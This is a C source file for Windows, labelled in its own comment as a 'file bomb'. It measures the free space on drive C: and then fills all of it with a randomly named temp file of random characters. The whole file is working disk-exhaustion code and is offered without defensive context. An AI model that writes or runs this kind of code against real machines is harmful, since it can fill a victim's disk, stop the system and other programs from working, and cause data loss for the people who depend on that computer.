#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define CHUNK_SIZE (1024 * 1024)

void GetRandomString(char* buffer, int length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int charsetSize = sizeof(charset) - 1;

    for (int i = 0; i < length; i++) {
        buffer[i] = charset[rand() % charsetSize];
    }
}

void GetRandomFileName(char* fileName, int length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int charsetSize = sizeof(charset) - 1;

    for (int i = 0; i < length; i++) {
        fileName[i] = charset[rand() % charsetSize];
    }
    fileName[length] = '\0'; 
}

ULONGLONG DetectDiskSpace() {
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;

    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
        return freeBytesAvailable.QuadPart; 
    } else {
        printf("Failed to get disk space. Error code: %lu\n", GetLastError());
        return 1;
    }
}

void CreateTempFile(ULONGLONG filesize) {
    CHAR tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char filename[8];
    GetRandomFileName(filename, 7);

    char fullPath[MAX_PATH];
    snprintf(fullPath, MAX_PATH, "%s%s.txt", tempPath, filename);

    HANDLE hFile = CreateFileA(
        fullPath,              
        GENERIC_WRITE,         
        0,                     
        NULL,                  
        CREATE_ALWAYS,         
        FILE_ATTRIBUTE_NORMAL, 
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to create file: %s\n", fullPath);
        return;
    }

    char* buffer = (char*)malloc(CHUNK_SIZE);
    
    if (!buffer) {
        printf("Memory allocation failed!\n");
        CloseHandle(hFile);
        return;
    }

    ULONGLONG bytesWritten = 0;
    DWORD written;

    printf("Writing file: %s (Size: %llu bytes)...\n", fullPath, filesize);
    
    while (bytesWritten < filesize) {
        DWORD writeSize = (filesize - bytesWritten > CHUNK_SIZE) ? CHUNK_SIZE : (DWORD)(filesize - bytesWritten);

        GetRandomString(buffer, writeSize);

        if (!WriteFile(hFile, buffer, writeSize, &written, NULL)) {
            DWORD errorCode = GetLastError();
            printf("Write error at %llu bytes. Error: %lu\n", bytesWritten, errorCode);
        }
        
        bytesWritten += written;
    }

    free(buffer);
    CloseHandle(hFile);
    printf("File creation completed: %s (Size: %llu bytes)\n", fullPath, bytesWritten);
}

int main() {
    srand((unsigned int)time(NULL));

    ULONGLONG filesize = DetectDiskSpace(); // Get available disk space
    CreateTempFile(filesize); // Create the file bomb with random strings

    return 0;
}
